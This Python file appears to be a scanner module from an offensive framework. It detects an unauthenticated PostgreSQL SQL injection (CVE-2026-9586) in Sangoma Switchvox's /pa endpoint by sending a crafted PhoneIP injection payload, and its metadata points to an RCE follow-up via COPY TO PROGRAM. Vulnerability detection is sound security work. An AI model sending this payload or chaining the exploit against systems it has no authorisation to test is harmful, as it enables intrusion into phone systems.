#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Sangoma Switchvox CVE-2026-9586 unauthenticated /pa SQL injection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Sangoma Switchvox CVE-2026-9586 SQLi Detect",
        "description": (
            "Detects CVE-2026-9586 in Sangoma Switchvox SMB before 8.4.0.2. The "
            "unauthenticated /pa phone-notification endpoint concatenates XML PhoneIP "
            "values into PostgreSQL queries. Uses a benign syntax-error probe only."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-9586"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-9586",
            "https://labs.sra.io/posts/switchvox/",
        ],
        "modules": ["exploits/multi/http/sangoma_switchvox_cve_2026_9586_rce"],
        "tags": [
            "web",
            "scanner",
            "switchvox",
            "sangoma",
            "voip",
            "sqli",
            "postgresql",
            "cve-2026-9586",
            "kev",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.35,
            "value": 1.1,
            "requires": {
                "endpoint_pattern_any": ["/pa"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "sqli", "from_detail": "PhoneIP XML field"},
                    {"capability": "rce_surface", "from_detail": "COPY TO PROGRAM"},
                ],
                "suggested_followups": [
                    "exploits/multi/http/sangoma_switchvox_cve_2026_9586_rce",
                ],
            },
        },
    }

    _SQL_MARKERS = (
        "syntax error",
        "postgresql",
        "pg_query",
        "invalid input syntax",
        "db-quirks",
        "auto_phone_config",
    )

    @staticmethod
    def _xml(phone_ip: str) -> str:
        return (
            '<?xml version="1.0" encoding="UTF-8"?>'
            "<IncomingCallEvent>"
            f"<PhoneIP>{phone_ip}</PhoneIP>"
            "</IncomingCallEvent>"
        )

    def _is_switchvox(self) -> bool:
        for path in ("/", "/main", "/login"):
            response = self.http_request(method="GET", path=path, allow_redirects=True)
            if not response:
                continue
            body = (response.text or "").lower()
            if "switchvox" in body or "sangoma" in body:
                return True
        return False

    def _pa_probe(self, phone_ip: str) -> str:
        response = self.http_request(
            method="POST",
            path="/pa",
            headers={"Content-Type": "text/xml"},
            data=self._xml(phone_ip),
            allow_redirects=False,
        )
        return (response.text or "") if response else ""

    def run(self):
        if not self._is_switchvox():
            return False

        benign = self._pa_probe("127.0.0.1")
        injected = self._pa_probe("127.0.0.1' AND 1=CAST((SELECT version()) AS int)--")
        merged = f"{benign}\n{injected}".lower()
        if any(marker in merged for marker in self._SQL_MARKERS):
            self.set_info(
                severity="critical",
                cve="CVE-2026-9586",
                reason="Switchvox /pa reflected PostgreSQL error on PhoneIP SQLi probe",
                path="/pa",
            )
            return True
        if injected and injected != benign and re.search(r"error|sql|query", injected, re.I):
            self.set_info(
                severity="high",
                cve="CVE-2026-9586",
                reason="Switchvox /pa differential response on PhoneIP injection probe",
                path="/pa",
            )
            return True
        return False
